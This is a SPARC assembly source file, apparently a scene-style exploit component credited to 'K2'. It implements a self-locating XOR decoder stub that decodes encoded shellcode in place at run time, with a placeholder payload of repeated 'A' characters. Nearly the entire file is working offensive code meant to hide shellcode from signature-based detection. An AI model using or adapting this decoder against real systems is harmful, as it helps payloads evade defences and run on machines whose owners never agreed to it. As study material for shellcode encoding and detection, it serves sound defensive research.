!! K2,
!! sparc xor decode
!! USES l7,l6,l5,l4,o7

.global main, printf
.align 4

main: 
more: bn,a     main     ! dont do anything, skip the next instruction also
wow:  bn,a     main     ! same as above
      call     wow      ! call backwards one instruction and load return address into %o7
back:
      sethi	%hi(0x42424242),%l5  ! load hi bits of decode key
      or	%l5,%lo(0x42424242),%l5 ! load rest of key

      add   %o7,0x42,%l7   ! add length to shellcodez
      xor   %l3,%l3,%l4    ! clear %l4 (my accumulator)
loop: ld    [%l7 + 4],%l6  ! load encoded shellcode
      add   %l4,0x1,%l4    ! distance travelled
      xor   %l6,%l5,%l6    ! xor decode 
      st    %l6,[%l7 + 4]  ! store decoded shellcode
      add   %l7,0x4,%l7    ! and update pointer      
      cmp   %l4,0x42       ! check FIN?
      ble   loop           ! if no, then loop
      flush %l7-4
down: 

str:  .asciz   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
